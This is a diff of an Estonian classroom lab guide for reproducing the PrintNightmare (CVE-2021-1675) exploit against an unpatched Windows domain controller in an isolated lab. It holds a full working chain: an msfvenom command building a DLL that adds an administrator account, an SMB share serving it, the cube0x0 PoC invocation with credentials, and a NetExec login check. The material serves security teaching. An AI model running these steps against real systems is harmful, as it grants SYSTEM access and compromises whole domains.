@@ -107,21 +107,29 @@ Võrguisolatsioon: VNet pakub laboris väljuva internetiühenduse (tööriistade
 ### 2.2 KALI — ründaja ettevalmistus
 
 1. Anna Kalile IP samasse võrku (nt 192.168.110.50), kontrolli ühendust: `ping 192.168.110.10`.
-2. Paigalda Impacket ja cube0x0 PoC.
+2. Paigalda Impacket ja cube0x0 PoC **eraldatud Pythoni keskkonda (venv)**.
 
-> **Tähtis tõrge, mida õpilased kohe kohtavad:** cube0x0 PoC vajab **tema enda Impacketi haru**, mis läheb vastuollu Kali vaikimisi Impacketiga. Seepärast:
+> **Tähtis tõrge, mida õpilased kohe kohtavad:** cube0x0 PoC vajab **tema enda Impacketi haru**, mis läheb vastuollu Kali vaikimisi Impacketiga. Tänapäevasel Kalil (Debian 12+, PEP 668) peatab süsteemne `pip install` end veaga `externally-managed-environment` ega lähe edasi. Lahendus on isoleeritud venv — nii ei pea süsteemset Impacketit üldse eemaldama (venv varjutab selle) ja paketihalduriga konflikti ei teki.
 
 ```bash
-# eemalda süsteemne impacket, et vältida versioonikonflikti
-pip3 uninstall impacket -y
+# eeldused
+sudo apt update && sudo apt install -y git python3-venv
 
-# cube0x0 impacket + PoC
-git clone https://github.com/cube0x0/impacket
-cd impacket && python3 -m pip install . && cd ..
+# eraldatud Pythoni keskkond ründe-tööriistadele
+python3 -m venv ~/pn-lab
+source ~/pn-lab/bin/activate        # NB! peab olema aktiivne IGAS Meetod A terminalis
+pip install --upgrade pip
 
-git clone https://github.com/cube0x0/CVE-2021-1675
+# cube0x0 impacket (fork) + PoC venv'i
+git clone https://github.com/cube0x0/impacket ~/pn-lab/impacket
+pip install ~/pn-lab/impacket
+git clone https://github.com/cube0x0/CVE-2021-1675 ~/pn-lab/CVE-2021-1675
 ```
-*Selgitus rea kaupa:* esimene käsk eemaldab olemasoleva Impacketi. Teine kloonib ja paigaldab cube0x0 versiooni (sisaldab muudetud `MS-RPRN`/`MS-PAR` tuge). Kolmas toob PoC-skripti `CVE-2021-1675.py`.
+*Selgitus rea kaupa:* `python3 -m venv` loob isoleeritud keskkonna; `source .../activate` lülitab selle sisse (ainult aktiivses venv'is resolvuvad `rpcdump.py`, `smbserver.py` ja PoC õige Impacketi forki peale). `pip install ~/pn-lab/impacket` paigaldab cube0x0 versiooni (muudetud `MS-RPRN`/`MS-PAR` tugi) venv'i. Viimane käsk toob PoC-skripti `CVE-2021-1675.py`.
+
+> **Reprodutseeritavus:** cube0x0 fork on 2021. aastast. Et labor töötaks ka aastate pärast (ja uuemal Pythonil), naeluta versioon kinni — nt `git -C ~/pn-lab/impacket checkout <TÖÖTAV_KOMMIT>` enne `pip install`-i. Nii ei lõhu forki või selle sõltuvuste hilisemad muudatused laborit.
+
+> **Igas uues terminalis** (nt eraldi aknad SMB-serverile ja ründele) käivita enne tööd uuesti `source ~/pn-lab/bin/activate`.
 
 ---
 
@@ -136,6 +144,7 @@ rpcdump.py @192.168.110.10 | egrep 'MS-RPRN|MS-PAR'
 ### Samm 2 — valmista pahavara DLL
 Klassiruumi-sõbralik variant (ei vaja tagasiühendust): DLL, mis lisab lokaalse admini.
 ```bash
+mkdir -p /tmp/share        # loo jagatav kaust ENNE — muidu msfvenom annab "No such file or directory"
 msfvenom -p windows/x64/exec CMD='net user haxor Passw0rd123! /add && net localgroup administrators haxor /add' -f dll -o /tmp/share/evil.dll
 ```
 *Selgitus:* `msfvenom` genereerib payloadi. `windows/x64/exec` käivitab antud käsu; siin loome uue kasutaja `haxor` ja lisame ta kohalike administraatorite gruppi. `-f dll` väljastab DLL-ina, `-o` salvestab faili. **Arhitektuur peab klappima (x64).**
@@ -144,21 +153,24 @@ msfvenom -p windows/x64/exec CMD='net user haxor Passw0rd123! /add && net localg
 
 ### Samm 3 — jaga DLL SMB kaudu
 ```bash
+# uues terminalis kõigepealt: source ~/pn-lab/bin/activate
 smbserver.py share /tmp/share -smb2support -user lab -password lab
 ```
 *Selgitus:* püstitab SMB-serveri, mis jagab kausta `/tmp/share` nime all `share`. `-smb2support` lubab SMB2. **`-user/-password`** on olulised, sest uuem Windows keeldub anonüümsest SMB-st — autenditud jagamine toimib usaldusväärsemalt.
 
 ### Samm 4 — käivita rünne
 ```bash
-python3 CVE-2021-1675/CVE-2021-1675.py lab.local/jaan:'Parool1!'@192.168.110.10 '\\192.168.110.50\share\evil.dll'
+# venv aktiivne (source ~/pn-lab/bin/activate)
+python3 ~/pn-lab/CVE-2021-1675/CVE-2021-1675.py lab.local/jaan:'Parool1!'@192.168.110.10 '\\192.168.110.50\share\evil.dll'
 ```
 *Selgitus rea kaupa:* `lab.local/jaan:'Parool1!'` on madala õigusega domeenikasutaja mandaat. `@192.168.110.10` on sihtserver DC01. Viimane argument on **UNC-tee** DLL-ini Kali SMB-jagamises. PoC sunnib DC01 Spoolerit seda DLL-i draiverina laadima — SYSTEM õigustes.
 
 ### Samm 5 — kontrolli tulemust
 Kui kasutasid admini-lisamise payloadi:
 ```bash
-crackmapexec smb 192.168.110.10 -u haxor -p 'Passw0rd123!'
-# või proovi uue kontoga SYSTEM-tasemel ligipääsu
+# NetExec (nxc) — crackmapexec'i järglane; crackmapexec on arhiveeritud ja puudub uuemas Kalis
+nxc smb 192.168.110.10 -u haxor -p 'Passw0rd123!'
+# (vanemas Kalis võib samaväärselt veel toimida 'crackmapexec smb ...')
 ```
 Kui kasutasid meterpreterit: handleris tekib sessioon, `getuid` näitab **NT AUTHORITY\SYSTEM**.
 
@@ -232,7 +244,7 @@ net localgroup administrators   # kas 'lpe' on administraatorite seas?
 - [ ] DC01: Server 2019 paigaldatud originaaltõmmisest, **paikamata**, Windows Update keelatud
 - [ ] DC01: AD DS + DNS püsti, domeen `lab.local`, Spooler Running
 - [ ] DC01: madala õigusega kasutaja `jaan` loodud
-- [ ] KALI: Impacket (cube0x0 haru) + `CVE-2021-1675` kloonitud, võrguühendus DC-ni olemas
+- [ ] KALI: venv `~/pn-lab` loodud, cube0x0 Impacket + `CVE-2021-1675` venv'i paigaldatud/kloonitud, võrguühendus DC-ni olemas
 - [ ] WS01 *(kui meetod B)*: domeeniga liitunud, Point and Print väärseadistus peal, madala õigusega sisselogimine
 - [ ] Defender/AV laboris välja lülitatud (demo puhtuseks)
 - [ ] VNet isoleeritud — väljast ligipääsmatu
